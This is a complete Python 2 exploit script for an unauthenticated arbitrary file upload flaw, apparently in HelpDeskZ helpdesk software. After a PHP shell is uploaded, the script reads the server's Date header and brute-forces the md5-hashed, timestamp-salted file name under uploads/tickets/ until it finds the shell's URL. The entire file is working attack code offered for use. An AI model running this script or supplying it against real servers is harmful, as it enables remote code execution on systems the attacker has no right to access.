#!/usr/bin/env python2
# -*- coding: utf-8 -*-
'''
# Exploit Title: Arbitrary File Upload
# Date: 2019-01-26
# Exploit Author: Simon Krenz @__4nx__
# Version: 1.0
# Inspired from HelpDeskZ 1.0.2 exploit

Upload file through normal mechanism and start this script. It will md5hash the file name
and tries to access it on the server. Timestamp will be added as salt before hashing. Time will be
taken from http date header of the first response and iterate over the time downwards. File
extension will be automatically taken from argv[2].

exploit.py http://localhost/support/ phpshell.php
'''
import hashlib
import time
import sys
import requests
from datetime import datetime

print 'Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl    = sys.argv[1]
fileName            = sys.argv[2]
fileExtension       = sys.argv[2].split('.')[1]
response            = requests.head(helpdeskzBaseUrl)
date                = response.headers['Date']
currentTime         = int(datetime.strptime(date, "%a, %d %b %Y %X %Z").strftime("%s")) + 3600

for x in range(0, 300):
    plaintext   = fileName + str(currentTime - x)
    md5hash     = hashlib.md5(plaintext).hexdigest()

    url         = helpdeskzBaseUrl + 'uploads/tickets/' + md5hash + '.' + fileExtension
    response    = requests.head(url)
    print url
    if response.status_code == 200:
        print "Accessed:"
        print url
        sys.exit(0)

print "Nothing found"
